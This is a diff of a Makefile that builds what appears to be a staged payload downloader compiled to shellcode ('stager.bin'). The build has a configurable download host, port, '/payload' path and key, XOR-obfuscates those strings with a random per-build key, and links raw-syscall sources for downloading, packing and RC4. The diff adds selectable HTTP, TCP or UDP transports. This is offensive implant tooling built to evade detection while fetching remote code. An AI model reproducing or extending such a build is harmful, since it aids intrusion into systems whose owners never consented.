@@ -20,7 +20,6 @@ DOWNLOAD_HOST ?= 127.0.0.1
 DOWNLOAD_PORT ?= 8080
 DOWNLOAD_PATH ?= /payload
 DOWNLOAD_KEY ?= secret
-LISTENER_TYPE ?= HTTP
 MODULE_PATH ?= 
 # Generate random XOR key per build
 XOR_KEY_VALUE := $(shell python3 -c "import random; print(hex(random.randint(128, 255)))")
@@ -33,8 +32,11 @@ XOR_KEY := $(shell python3 -c "s='$(DOWNLOAD_KEY)'; k=$(XOR_KEY_VALUE); print(',
 XOR_MODULE_PATH := $(shell python3 -c "s='$(MODULE_PATH)'; k=$(XOR_KEY_VALUE); print(','.join(hex(ord(c)^k) for c in s) + ',0x00' if s else '0x00')")
 XOR_LIB_PATH := $(shell python3 -c "s='$(DOWNLOADER_MODULE_PATH)'; k=$(XOR_KEY_VALUE); print(','.join(hex(ord(c)^k) for c in s) + ',0x00' if s else '0x00')")
 
-# Define listener type
-COMMON_CFLAGS += -DLISTENER_$(LISTENER_TYPE)
+# Transport selection: which transport_*.c to compile.
+# Built-in freestanding transports: http, tcp, udp (raw syscalls, no libc).
+# Add your own transport_<name>.c and select it with TRANSPORT=<name>.
+TRANSPORT ?= http
+TRANSPORT_SRC = transport_$(TRANSPORT).c
 
 # Config options
 COMMON_CFLAGS += -DENCODED_HOST="$(XOR_HOST)"
@@ -45,7 +47,7 @@ COMMON_CFLAGS += -DENCODED_MODULE_PATH="$(XOR_MODULE_PATH)"
 COMMON_CFLAGS += -DENCODED_LIB_PATH="$(XOR_LIB_PATH)"
 COMMON_CFLAGS += -DCONFIG_XOR_KEY=$(XOR_KEY_VALUE)
 
-STAGE0_SRCS = downloader.c net_utils.c utils_min.c packer.c rc4.c debug.c syscalls.c
+STAGE0_SRCS = downloader.c $(TRANSPORT_SRC) net_utils.c utils_min.c packer.c rc4.c debug.c syscalls.c
 
 STAGE0_TARGET = stager
 SHELLCODE = stager.bin
